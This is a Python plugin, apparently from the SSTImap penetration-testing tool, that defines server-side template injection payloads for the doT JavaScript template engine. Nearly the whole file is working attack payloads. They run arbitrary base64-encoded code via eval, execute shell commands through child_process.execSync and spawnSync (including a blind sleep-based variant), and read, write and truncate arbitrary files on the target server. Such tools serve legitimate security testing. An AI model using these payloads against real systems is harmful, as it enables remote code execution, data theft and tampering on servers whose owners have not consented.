from plugins.languages import javascript
from utils import rand


class Dot(javascript.Javascript):
    generic_plugin = True
    priority = 5
    plugin_info = {
        "Description": """doT template engine""",
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Updates for SSTImap
        ],
        "Engine": [
            "Github: https://github.com/olado/doT",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '{{{{={header[0]}+{header[1]}}}}}',
                'trailer': '{{{{={trailer[0]}+{trailer[1]}}}}}',
                'test_render': f'{{{{=typeof({rand.randints[0]})+{rand.randints[1]}}}}}',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            'render_error': {
                'header': """{{{{=''['x'][({header[0]}+{header[1]}).toString()+""",
                'trailer': """+({trailer[0]}+{trailer[1]}).toString()]}}}}""",
            },
            'evaluate': {
                'evaluate': """{{{{=eval(Buffer('{code_b64p}', 'base64').toString())}}}}""",
                'test_os': """global.process.mainModule.require('os').platform()""",
            },
            'evaluate_error': {
                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """{{{{=''}}}}{{{{=[""][0+!eval(Buffer('{code_b64p}', 'base64').toString())]["length"]}}}}"""
            },
            'execute': {
                'call': 'evaluate',
                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString());"""
            },
            'execute_blind': {
                # The bogus prefix is to avoid false detection of Javascript instead of doT
                'call': 'inject',
                'execute_blind': """{{{{=''}}}}{{{{global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}');}}}}"""
            },
            'execute_boolean': {
                'call': 'evaluate_blind',
                # spawnSync() shell option has been introduced in node 5.7, so this will not work with old node versions.
                # TODO: use another function.
                'execute_blind': """global.process.mainModule.require('child_process').spawnSync(Buffer('{code_b64p}', 'base64').toString(), options={{shell:true}}).status===0"""
            },
            'write': {
                'call': 'inject',
                'write': """{{{{=global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')}}}}""",
                'truncate': """{{{{=global.process.mainModule.require('fs').writeFileSync('{path}', '')}}}}"""
            },
            'read': {
                'call': 'evaluate',
                'read': """global.process.mainModule.require('fs').readFileSync('{path}').toString('base64');"""
            },
            'md5': {
                'call': 'evaluate',
                'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex");"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            {'level': 1, 'prefix': '{closure};}}}}', 'suffix': '{{1;', 'closures': javascript.ctx_closures},
        ])
        
